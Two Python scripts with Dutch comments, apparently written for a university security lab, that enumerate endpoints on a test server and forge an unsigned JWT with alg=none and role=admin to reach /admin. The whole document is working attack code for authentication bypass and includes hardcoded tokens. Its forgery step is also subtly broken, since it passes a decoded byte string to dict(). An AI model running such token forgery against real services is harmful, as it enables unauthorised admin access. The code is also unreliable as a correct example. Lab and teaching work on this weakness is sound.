import socket

HOST = 'cns-test.idlab.uantwerpen.be'
PORT = 50010
def do_request(path, method="GET", extra_headers="", body=""):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        body_bytes = body.encode('utf-8')
        request = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"{extra_headers}"
            f"Content-Length: {len(body_bytes)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{body}"
        )
        s.sendall(request.encode('utf-8'))
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    return data.decode('utf-8', errors='replace')

paths_to_try = [
    "/login", "/api/login", "/auth", "/auth/login",
    "/register", "/admin", "/token", "/users",
    "/api", "/help", "/docs", "/index"
]

for p in paths_to_try:
    resp = do_request(p)
    status_line = resp.split("\r\n")[0]
    print(f"{p:20s} -> {status_line}")

print(do_request("/login"))

resp = do_request("/admin", extra_headers="Authorization: Bearer eyJlbmMiOiJBRVMtQ0JDIiwibWFjIjoiSE1BQy1TSEEyNTYiLCJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.wQMSkK6aKMVOrIEjEecMeNr8SwxqeFy6ehOIZhjQ97s.1a-6lAwyBDjAjMlULksJ4eYxmV3u5rvufNdVpOuXptY.\r\n")
print(resp)


import socket
import base64
import json

HOST = 'cns-test.idlab.uantwerpen.be'
PORT = 50010


def do_request(path, method="GET", extra_headers="", body=""):
    """Stuur een rauwe HTTP-request over een socket en geef het volledige antwoord terug."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        body_bytes = body.encode('utf-8')
        request = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"{extra_headers}"
            f"Content-Length: {len(body_bytes)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{body}"
        )
        s.sendall(request.encode('utf-8'))
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    return data.decode('utf-8', errors='replace')


def split_http_response(raw_response):
    """Splits een rauwe HTTP-response in (headers, body)."""
    headers, _, body = raw_response.partition("\r\n\r\n")
    return headers, body


def b64url_decode(s: str) -> bytes:
    """Decodeer een base64url-string (zonder padding) naar bytes."""
    s += '=' * (-len(s) % 4)  # padding aanvullen tot veelvoud van 4
    return base64.urlsafe_b64decode(s)


def b64url_encode(data: bytes) -> str:
    """Encodeer bytes naar een base64url-string zonder padding (JWT-stijl)."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def decode_jwt(token: str):
    """Decodeer header en payload van een JWT (signature wordt niet geverifieerd)."""
    header_b64, payload_b64, signature_b64 = token.split('.')
    header = json.loads(b64url_decode(header_b64))
    payload = b64url_decode(payload_b64)

    return header, payload, signature_b64


def forge_none_alg_token(payload: dict) -> str:
    """
    Bouw een JWT met alg=none en een lege signature.
    Dit vertrouwt op servers die het 'alg'-veld uit de header blindelings volgen
    en daardoor de signature-check overslaan als alg == 'none'.
    Geen geheime sleutel nodig.
    """
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    return f"{header_b64}.{payload_b64}."  # signature blijft leeg


def main():
    # --- Stap 1: log in als guest en haal het originele token op ---
    login_response = do_request("/login")
    _, login_body = split_http_response(login_response)
    login_data = json.loads(login_body)
    original_token = login_data["token"]
    print("[*] Ontvangen token:", original_token)

    token = "eyJlbmMiOiJBRVMtQ0JDIiwibWFjIjoiSE1BQy1TSEEyNTYiLCJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.EwXWI7jiYZ5oQYPya6sCYOub28yYKHlBhWCy61_YpY.WvJ7cLRv_4HEJQlGd5S0FCkDjxcqDScUpJpWYGTMqK4"
    # --- Stap 2: decodeer het token om te zien wat erin zit ---
    header, payload, _ = decode_jwt(token)
    print("[*] Header: ", header)
    print("[*] Payload:", payload)

    # --- Stap 3: vervals een token met alg=none en role=admin ---
    forged_payload = dict(payload)  # kopie van originele payload
    forged_payload["role"] = "admin"
    forged_token = forge_none_alg_token(forged_payload)
    print("[*] Vervalst token:", forged_token)

    # --- Stap 4: gebruik het vervalste token om bij /admin te komen ---
    admin_response = do_request(
        "/admin",
        extra_headers=f"Authorization: Bearer {forged_token}\r\n"
    )
    admin_headers, admin_body = split_http_response(admin_response)

    status_line = admin_headers.splitlines()[0]
    print("[*] Status /admin:", status_line)
    print("[*] Response body:", admin_body)


if __name__ == "__main__":
    main()

